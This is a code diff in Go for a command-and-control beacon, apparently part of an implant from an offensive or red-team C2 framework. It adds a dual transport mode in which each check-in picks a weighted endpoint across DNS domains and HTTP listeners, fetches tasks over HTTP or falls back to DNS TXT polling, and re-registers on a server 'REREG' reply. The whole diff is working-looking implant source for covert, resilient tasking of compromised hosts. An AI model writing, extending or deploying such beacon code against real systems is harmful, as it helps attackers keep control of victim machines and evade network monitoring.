@@ -114,6 +114,30 @@ func (b *Beacon) checkIn() (string, error) {
 		pollPhase := b.client.config.GetPollPhase()
 		pollData := fmt.Sprintf("POLL|%s", b.id)
 
+		// Dual: each check-in goes to one endpoint chosen by the weighted
+		// selector across DNS domains and HTTP listeners. An HTTP-chosen poll
+		// uses exactly that listener; a DNS-chosen poll falls through to the DNS
+		// paths below (bypassing the HTTP-first sendControlMessage). The DNS
+		// path already rotates domains, so the class decision is all dual mode
+		// adds here.
+		pollViaDNS := false
+		if b.transport != nil && b.transport.Mode() == transportDual {
+			kind, idx := b.transport.SelectEndpoint()
+			if kind == "http" {
+				timestamp := fmt.Sprintf("%05d", time.Now().Unix()%100000)
+				response, err := b.transport.SendTo(idx, "task", pollData+"|"+timestamp)
+				if err != nil {
+					return "", fmt.Errorf("HTTP poll failed: %v", err)
+				}
+				if response == "REREG" {
+					b.regStage.Store(0)
+					return "", nil
+				}
+				return response, nil
+			}
+			pollViaDNS = true
+		}
+
 		// HTTP-only: the listener delivers the task in the response, and no DNS
 		// C2 query is sent at all.
 		if b.transport != nil && b.transport.Mode() == transportHTTP {
@@ -186,10 +210,17 @@ func (b *Beacon) checkIn() (string, error) {
 			return "ACK", nil
 		}
 
-		// TXT mode poll (default). Routed through the transport seam so a dual
-		// mode beacon fetches over HTTP while HTTP is healthy, and a DNS-mode
-		// beacon behaves exactly as before.
-		response, err := b.sendControlMessage(pollData, pollPhase.PhaseConfig)
+		// TXT mode poll (default). A DNS-chosen dual poll stays on DNS; every
+		// other case routes through the transport seam so a dual mode beacon
+		// fetches over HTTP while HTTP is healthy, and a DNS-mode beacon behaves
+		// exactly as before.
+		var response string
+		var err error
+		if pollViaDNS {
+			response, err = b.client.sendPhaseCommand(pollData, pollPhase.PhaseConfig)
+		} else {
+			response, err = b.sendControlMessage(pollData, pollPhase.PhaseConfig)
+		}
 		if err != nil {
 			return "", fmt.Errorf("poll failed: %v", err)
 		}
